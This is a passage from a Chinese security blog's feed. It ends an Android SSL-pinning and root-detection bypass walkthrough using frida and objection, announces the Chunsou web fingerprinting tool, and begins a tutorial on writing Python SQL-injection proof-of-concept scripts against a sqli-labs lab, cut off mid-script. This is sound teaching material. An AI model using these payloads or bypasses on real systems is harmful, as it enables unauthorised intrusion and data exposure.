data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar GetAPKInfo.jar apk包路径</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/apk_info.png" data-caption="apk_info"><img src="/../images/app/bypass/apk_info.png" alt="apk_info"></a></p><p>6、返回 adb 启动 frida-server</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-16.1.2-android-arm64 (若 + &amp; 则在 Android 后台运行)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/frida-2.png" data-caption="frida-2"><img src="/../images/app/bypass/frida-2.png" alt="frida-2"></a></p><p>7、启动 Objection ，通过进入 Objection 关掉 Root 和 SSL Pinning</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g 刚才通过GetAPKInfo获取待测app的包名 explore</span><br></pre></td></tr></table></figure></div><p>当使用上述命令后即对指定包的 APP 启动了 Objection 工具 ,然后手机上会调用启动 APP ，此时手机会自动弹出 APP 界面并运行</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/objection-2.png" data-caption="objection-2"><img src="/../images/app/bypass/objection-2.png" alt="objection-2"></a></p><p>此时就可以在 Objection 上禁用该 APP 的 Root 和 SSL Pinning</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android root disable</span><br><span class="line">android sslpinning disable</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/objection_3.png" data-caption="objection_3"><img src="/../images/app/bypass/objection_3.png" alt="objection_3"></a></p><p>8、此时可利用常规手段 Fiddler + Burp 进行 HTTPS 流量抓包，即可绕过 SSL Pinning 机制获取 HTTPS 流量包，Fiddler 下载链接：<a href="https://telerik-fiddler.s3.amazonaws.com/fiddler/FiddlerSetup.exe">https://telerik-fiddler.s3.amazonaws.com/fiddler/FiddlerSetup.exe</a></p><p>1）配置抓取 HTTPS 流量，<code>Tools-》Options-》HTTPS</code></p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-1.png" data-caption="fiddler-1"><img src="/../images/app/bypass/fiddler-1.png" alt="fiddler-1"></a></p><p>勾选 <code>HTTPS </code>勾选后会弹出安装证书的提示，根据提示一直点击 是 安装即可。</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-2.png" data-caption="fiddler-2"><img src="/../images/app/bypass/fiddler-2.png" alt="fiddler-2"></a></p><p>2）配置代理端口 <code>Tools — Options — Connections</code>，端口选择 9000（可随意更改），勾选 Allow remote computers to connect ，点击 OK，重启 Fiddle 使配置生效</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-3.png" data-caption="fiddler-3"><img src="/../images/app/bypass/fiddler-3.png" alt="fiddler-3"></a></p><p>3）配置手机端代理与 Fiddler 设置的端口一致，让 APP 流量走 Fiddler 这里手机也是同一 WIFI 下的本机 IP。</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-4.png" data-caption="fiddler-4"><img src="/../images/app/bypass/fiddler-4.png" alt="fiddler-4"></a></p><p>配置后，在手机浏览器访问上面设置的 IP 地址和端口号，我这里是 192.168.1.102:9000（这里要根据实际情况），然后 FiddlerRoot certificate 进行下载证书，并自行安装配置</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-5.png" data-caption="fiddler-5"><img src="/../images/app/bypass/fiddler-5.png" alt="fiddler-5"></a></p><p>5）Fiddler 配置，<code>Tools-》Options-》Gateway-》Manual Proxy Configuration</code> 填写 127.0.0.1:8080 使与 Burp 的监听地址一致。</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-7.png" data-caption="fiddler-7"><img src="/../images/app/bypass/fiddler-7.png" alt="fiddler-7"></a></p><p>6）<code>Burp</code> 开启监听，等待 <code>Fiddler</code> 流量转发过来</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-6.png" data-caption="fiddler-6"><img src="/../images/app/bypass/fiddler-6.png" alt="fiddler-6"></a></p><p>7）最后返回待测 APP 上点击功能点，流量从 Fiddler 转发到了 Burp，这里就不用展示了，在遇到需要测试的 APP 存在 SSL Pinning 自己可去实践一下即可。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>本文实践起来不算复杂，但需要理解 adb、手机 Root 、hook、抓包 等技术的基础原理，通过串联几种基础的技术进而加深了解 Android 测试过程中遇到问题以及解决方法。</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://saucer-man.com/information_security/930.html#cl-1</span><br><span class="line">https://www.hackingarticles.in/android-hooking-and-sslpinning-using-objection-framework/</span><br><span class="line">https://zhuanlan.zhihu.com/p/127847550</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Root </tag>
            
            <tag> SSL Pinning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunsou（春蒐）多线程Web指纹识别工具（项目发布）</title>
      <link href="/2023/07/04/Chunsou%EF%BC%88%E6%98%A5%E8%92%90%EF%BC%89%E5%A4%9A%E7%BA%BF%E7%A8%8BWeb%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7%EF%BC%88%E9%A1%B9%E7%9B%AE%E5%8F%91%E5%B8%83%EF%BC%89/"/>
      <url>/2023/07/04/Chunsou%EF%BC%88%E6%98%A5%E8%92%90%EF%BC%89%E5%A4%9A%E7%BA%BF%E7%A8%8BWeb%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7%EF%BC%88%E9%A1%B9%E7%9B%AE%E5%8F%91%E5%B8%83%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="📖-简介"><a href="#📖-简介" class="headerlink" title="📖 简介"></a>📖 简介</h2><p>Chunsou（春蒐），Python3编写的多线程Web指纹识别工具，适用于安全测试人员前期的资产识别、风险收敛以及企业互联网资产摸查。目前主要功能为针对Web资产进行指纹识别，目前指纹规则条数约 10000+，辅助功能包括子域名爆破和FOFA、Hunter资产收集。工具开发初衷为辅助网络安全人员开展测试工作，提高资产识别和管理的效率。</p><p><a href="https://github.com/Funsiooo/chunsou/tree/main/doc/Readme.md">[English Readme]</a></p><h2 id="🥏-选项"><a href="#🥏-选项" class="headerlink" title="🥏 选项"></a>🥏 选项</h2><p>Chunsou（春蒐）支持多线程扫描，默认线程为50，可根据需求指定线程数；可联动oneforall进行子域名爆破；支持调用 fofa api 进行资产收集；自定义流量代理；指定输出结果路径</p><p><a data-fancybox="gallery" data-src="/../images/chunsou/1-17080738131781.png" data-caption="command_image"><img src="/../images/chunsou/1-17080738131781.png" alt="command_image"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">usage: python3 chunsou.py [options]</span><br><span class="line"></span><br><span class="line">target:</span><br><span class="line">  -u , --url            scan for a single url</span><br><span class="line">  -f , --file           specify a file for multi scanning</span><br><span class="line"></span><br><span class="line">subdomain:</span><br><span class="line">  -du , --domain        subdomain blasting of a single domain name</span><br><span class="line">  -df , --domains       subburst the domain name in the specified file</span><br><span class="line"></span><br><span class="line">api:</span><br><span class="line">  -fo , --fofa          call the fofa api for asset collection</span><br><span class="line">  -hu , --hunter        call the hunter api for asset collection</span><br><span class="line">  -tip                  spatial mapping search syntax reference</span><br><span class="line"></span><br><span class="line">others:</span><br><span class="line">  -p , --proxy          proxy scan traffic</span><br><span class="line">  -t , --threads        specify the number of scanning threads, default 50</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -o , --output         specified output file</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">  -u , --url            python3 chunsou.py -u http://example.com</span><br><span class="line">  -f , --file           python3 chunsou.py -f urls.txt</span><br><span class="line">  -p  , --proxy         python3 chunsou.py -u http://example.com -p http://127.0.0.1</span><br><span class="line">  -t  , --threads       python3 chunsou.py -f urls.txt -t 100</span><br><span class="line">  -o  , --output        python3 chunsou.py -f -o results.xlsx</span><br><span class="line">  -du , --domain        python3 chunsou.py -du example.com</span><br><span class="line">  -df , --domains       python3 chunsou.py -df domains.txt</span><br><span class="line">  -fo , --fofa          python3 chunsou.py -fo domain=&quot;example.com&quot;</span><br><span class="line">  -hu , --hunter        python3 chunsou.py -hu domain=&quot;example.com&quot;</span><br><span class="line">  -tip,                 python3 chunsou.py -tip</span><br><span class="line">  -e  ,                 python3 chunsou.py -f urls.txt -e</span><br></pre></td></tr></table></figure></div><h2 id="🛫-使用"><a href="#🛫-使用" class="headerlink" title="🛫 使用"></a>🛫 使用</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>目前输出文件默认保存在 <code>results</code> 目录下，现支持<code>txt</code>、<code>xlsx</code> 格式，指纹识别输出信息显示顺序 <code>| 已匹配到的指纹 | 网站标题 | 网站所用的技术栈</code></p><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></div><h3 id="具体使用指令"><a href="#具体使用指令" class="headerlink" title="具体使用指令"></a>具体使用指令</h3><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单目标指纹识别</span></span><br><span class="line">python3 chunsou.py -u http://example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多目标指纹识别（默认只输出成功请求的结果，报错url不显示，若需要显示报错信息加上 -e ）</span></span><br><span class="line">python3 chunsou.py -f urls.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单目标子域名爆破(目前调用 oneforall 进行子域名爆破)</span></span><br><span class="line">python3 chunsou.py -du example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多目标子域名爆破</span></span><br><span class="line">python3 chunsou.py -df domains.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 fofa api 进行资产收集,需要在 /modules/config/config.ini 进行 fofa api key 配置</span></span><br><span class="line">python3 chunsou.py -fo domain=<span class="string">&quot;example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 hunter api 进行资产收集,需要在 /modules/config/config.ini 进行 hunter api key 配置</span></span><br><span class="line">python3 chunsou.py -hunter domain=<span class="string">&quot;example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出显示 fofa hunter 基本搜索语法</span></span><br><span class="line">python3 chunsou.py -tip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定线程（默认50）</span></span><br><span class="line">python3 chunsou.py -u http://example.com -t <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定输出结果格式（txt、xlsx）</span></span><br><span class="line">python3 chunsou.py -f urls.txt -o result.xlsx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代理流量（http、https、socks5）</span></span><br><span class="line">python3 chunsou.py -f urls.txt -p http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">7890</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="🪐-指纹"><a href="#🪐-指纹" class="headerlink" title="🪐 指纹"></a>🪐 指纹</h2><p>部分指纹来源于优秀开源项目 <a href="https://github.com/EdgeSecurityTeam/EHole">Ehole</a> 、 <a href="https://github.com/zhzyker/dismap">dismap</a>、 以及部分自收集，目前指纹规则条数约 10000+ (指纹条数，非程序个数)</p><p>指纹规则，目前支持<code>网站关键字</code>、<code>网站 title</code>、<code>网站 header</code>、<code>网站 ico hash</code> 四种指纹匹配方式，相应规则如下：</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;亿赛通电子文档安全管理系统&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyword&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;电子文档安全管理系统&quot;</span><span class="punctuation">,</span> <span class="string">&quot;CDGServer3&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;禅道&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icon_hash&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyword&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;3514039281&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ecology&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;header&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyword&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ecology_JSessionid&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nacos&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;title&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyword&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;Nacos&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="🛎️-FQA"><a href="#🛎️-FQA" class="headerlink" title="🛎️ FQA"></a>🛎️ FQA</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、后续加强对现有指纹的适配以及不定期更新自收集的指纹</span><br><span class="line">2、bug反馈：https://github.com/Funsiooo/chunsou/issues</span><br><span class="line">3、使用时注意网络问题，由于部分网站防火墙或其他策略原因使用科学网络或网络不稳定会导致部分扫描报错异常</span><br><span class="line">4、工具更新详情可查看log.md</span><br><span class="line">5、指纹不定期更新，最新指纹请下载 modules/config/finger.json 文件自行替换</span><br></pre></td></tr></table></figure></div><h2 id="⭐-Star-History"><a href="#⭐-Star-History" class="headerlink" title="⭐ Star History"></a>⭐ Star History</h2><p><a href="https://star-history.com/#Funsiooo/chunsou&Date"><a data-fancybox="gallery" data-src="https://api.star-history.com/svg?repos=Funsiooo/chunsou&type=Date" data-caption="Star History Chart"><img src="https://api.star-history.com/svg?repos=Funsiooo/chunsou&type=Date" alt="Star History Chart"></a></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 指纹识别 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Poc编写实例：从原理到实践</title>
      <link href="/2023/05/22/Python%20Poc%E7%BC%96%E5%86%99%E5%AE%9E%E4%BE%8B%EF%BC%9A%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E8%B7%B5/"/>
      <url>/2023/05/22/Python%20Poc%E7%BC%96%E5%86%99%E5%AE%9E%E4%BE%8B%EF%BC%9A%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>POC（Proof of Concept，概念验证）指为了验证某个潜在的漏洞或安全问题而编写的脚本。本文主要介绍关于漏洞验证 Python PoC  的编写实例和简单的编写思路，并挑选几种类型的漏洞进行了 Poc 实例编写和测试验证,代码编写难度相对较为简单，主要是相关库的运用及简单的思路是实现。</p><h2 id="二、SQL注入"><a href="#二、SQL注入" class="headerlink" title="二、SQL注入"></a>二、SQL注入</h2><p>本节 “基础学习” 小节中主要通过搭建 sali-lab 漏洞环境进行简单的实例编写，用于初步了解 GET 与 POST 注入脚本编写的区别，由简单的环境开始逐渐过渡到完整的 Poc 编写。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这边利用 docker 搭建 sqli-lab 漏洞环境，命令如下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docekr search sqli-lab</span><br><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line">docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs</span><br></pre></td></tr></table></figure></div><p>访问本地 80 端口，点击 <code>Setup/reset Database for labs</code> 后完成安装</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230505210826702.png" data-caption="image-20230505210826702"><img src="/../images/poc/image-20230505210826702.png" alt="image-20230505210826702"></a></p><h3 id="基础学习"><a href="#基础学习" class="headerlink" title="基础学习"></a>基础学习</h3><p><strong>1、单引号报错注入（GET）</strong>，GET 型单引号注入利用 Less-1 进行 Poc 代码编写学习</p><p>正常页面</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230505211525289.png" data-caption="image-20230505211525289"><img src="/../images/poc/image-20230505211525289.png" alt="image-20230505211525289"></a></p><p>单引号 SQL 语句报错</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230505211553674.png" data-caption="image-20230505211553674"><img src="/../images/poc/image-20230505211553674.png" alt="image-20230505211553674"></a></p><p>经测试发现存在 SQL 注入，可通过插入 Payload 查询并在页面上回显数据库版本信息，具体 Payload 如下</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;</span>utgs<span class="string">&#x27;=&#x27;</span>utgs</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230505220510216.png" data-caption="image-20230505220510216"><img src="/../images/poc/image-20230505220510216.png" alt="image-20230505220510216"></a></p><p><strong>Poc 简单编写</strong></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：Single_quotes_error_based_injection.py.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入 requests 库</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动设置漏洞链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155/Less-1/?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 headers 头，告诉服务器请求的客户端是什么类型的设备或应用程序，有些服务器可能会根据User-Agent字段来做特定的处理，例如根据设备类型返回不同的内容或应用不同的限制策略，避免被 ban</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 SQL 语句，查询数据库版本</span></span><br><span class="line">payload = <span class="string">&quot;&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;utgs&#x27;=&#x27;utgs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送HTTP请求，注入 payload 并获取页面响应</span></span><br><span class="line">res = requests.get(url + payload,  headers=headers, timeout = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若 res 返回的响应中存在 &quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot; 则证明存在漏洞，否则不存在</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]Vulnerable to SQL injection: &#x27;</span> + url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Not Vulnerable: &#x27;</span> + url)</span><br></pre></td></tr></table></figure></div><p>当存在漏洞时，返回 <code>[+] Vulnerable to SQL injection: + url</code> 响应</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522134019340.png" data-caption="image-20230522134019340"><img src="/../images/poc/image-20230522134019340.png" alt="image-20230522134019340"></a></p><p>当不存在漏洞时，返回 <code>[+] Not Vulnerable : + url</code>  响应</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522134053028.png" data-caption="image-20230522134053028"><img src="/../images/poc/image-20230522134053028.png" alt="image-20230522134053028"></a></p><p><strong>2、单引号报错注入（POST）</strong>，POST 型单引号注入利用 Less-11 进行 Poc 代码编写学习</p><p>正常页面</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230508134427501.png" data-caption="image-20230508134427501"><img src="/../images/poc/image-20230508134427501.png" alt="image-20230508134427501"></a></p><p> 通过抓包分析，参数 <code>username</code>、<code>password</code> 均存在单引号报错注入</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230508135018385.png" data-caption="image-20230508135018385"><img src="/../images/poc/image-20230508135018385.png" alt="image-20230508135018385"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230508135056209.png" data-caption="image-20230508135056209"><img src="/../images/poc/image-20230508135056209.png" alt="image-20230508135056209"></a></p><p>经过测试后，确定其数据库版本，具体 payload 为</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;</span>utgs<span class="string">&#x27;=&#x27;</span>utgs</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230508134932111.png" data-caption="image-20230508134932111"><img src="/../images/poc/image-20230508134932111.png" alt="image-20230508134932111"></a></p><p><strong>Poc 简单编写</strong></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：post_sql_injection.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入 requests 库</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动设置漏洞链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155/Less-12/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 headers 头，告诉服务器请求的客户端是什么类型的设备或应用程序，有些服务器可能会根据User-Agent字段来做特定的处理，例如根据设备类型返回不同的内容或应用不同的限制策略，避免被 ban</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span 